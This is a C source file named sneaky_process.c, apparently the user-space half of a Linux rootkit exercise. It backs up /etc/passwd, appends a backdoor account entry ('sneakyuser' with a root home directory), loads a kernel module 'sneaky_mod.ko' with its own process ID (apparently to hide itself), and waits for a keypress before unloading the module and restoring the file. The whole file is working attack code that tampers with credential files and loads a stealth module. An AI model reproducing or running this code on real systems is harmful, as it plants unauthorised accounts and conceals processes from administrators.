// sneaky_process.c
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <termios.h>  
#include <string.h>
#include <fcntl.h>

static struct termios oldt;  // 全局保存旧设置

void restore_terminal(void) {
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
}


int main(void) {
    // 1) Print our own PID
    printf("sneaky_process pid = %d\n", getpid());

    // 2) backup and corrupt /etc/passwd 
    int src = open("/etc/passwd", O_RDONLY);
    if (src < 0) { perror("open /etc/passwd"); exit(EXIT_FAILURE); }
    int dst = open("/tmp/passwd",
                   O_WRONLY | O_CREAT | O_TRUNC,
                   S_IRUSR | S_IWUSR);
    if (dst < 0) { perror("open /tmp/passwd"); close(src); exit(EXIT_FAILURE); }

    char buf[4096];
    ssize_t n;
    while ((n = read(src, buf, sizeof(buf))) > 0) {
        if (write(dst, buf, n) != n) {
            perror("write backup"); close(src); close(dst); exit(EXIT_FAILURE);
        }
    }
    close(src);
    close(dst);

    FILE *fp = fopen("/etc/passwd", "a");
    if (!fp) { perror("fopen /etc/passwd"); exit(EXIT_FAILURE); }
    fprintf(fp,
        "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
    fclose(fp);

    write(STDOUT_FILENO, "[DBG] after backup\n", 19);

    // 3) ensure old module is gone, then insert ours
    system("rmmod sneaky_mod 2>/dev/null || true");
    char cmd[128];
    snprintf(cmd, sizeof(cmd),
        "insmod ./sneaky_mod.ko sneaky_pid=%d",
        getpid());
    int ret = system(cmd);
    if (ret != 0) {
        fprintf(stderr,
        "ERROR: insmod failed (return code %d). Command was:\n  %s\n",
        ret, cmd);
    }
    write(STDOUT_FILENO, "[DBG] after insmod\n", 20);

    // 4) raw‐mode single‐char loop
    const char *msg = "Sneaky mode active; press 'q' to quit\n";
    write(STDOUT_FILENO, msg, strlen(msg));

    // switch terminal into non‐canonical, no‐echo mode
    struct termios newt;
    if (tcgetattr(STDIN_FILENO, &oldt) < 0) {
        perror("tcgetattr");
        exit(EXIT_FAILURE);
    }
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    if (tcsetattr(STDIN_FILENO, TCSANOW, &newt) < 0) {
        perror("tcsetattr");
        exit(EXIT_FAILURE);
    }

    // read one char at a time until we see 'q'
    char c;
    while (read(STDIN_FILENO, &c, 1) == 1) {
        if (c == 'q') {
            const char *bye = "Got 'q', exiting sneak mode\n";
            write(STDOUT_FILENO, bye, strlen(bye));
            break;
        }
    }

    // restore original terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);

    // 5) unload the sneaky kernel module
    if (system("rmmod sneaky_mod") != 0) {
        perror("system(\"rmmod sneaky_mod\")");
    }

    // 6) restore the original passwd file
    int in = open("/tmp/passwd", O_RDONLY);
    if (in < 0) { perror("open /tmp/passwd"); }
    else {
        int out = open("/etc/passwd",
                    O_WRONLY | O_TRUNC);
        if (out < 0) { perror("open /etc/passwd for restore"); }
        else {
            char buf2[4096];
            ssize_t m;
            while ((m = read(in, buf2, sizeof(buf2))) > 0) {
                if (write(out, buf2, m) != m) {
                    perror("write restore");
                    break;
                }
            }
            close(out);
        }
        close(in);
    }

    if (unlink("/tmp/passwd") < 0) {
        perror("unlink /tmp/passwd");
    }
    
    return 0;
}



